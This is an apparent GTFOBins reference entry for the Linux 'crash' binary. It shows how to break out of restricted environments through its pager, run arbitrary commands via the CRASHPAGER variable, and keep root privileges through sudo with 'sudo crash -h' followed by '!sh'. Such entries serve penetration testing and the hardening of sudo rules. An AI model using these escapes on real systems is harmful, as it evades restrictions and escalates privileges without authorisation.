# GTFOBin: crash

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be `less`, other functions may apply.

```
crash -h
!sh
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

```
COMMAND='/usr/bin/id'
CRASHPAGER="$COMMAND" crash -h
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be `less`, other functions may apply.

```
sudo crash -h
!sh
```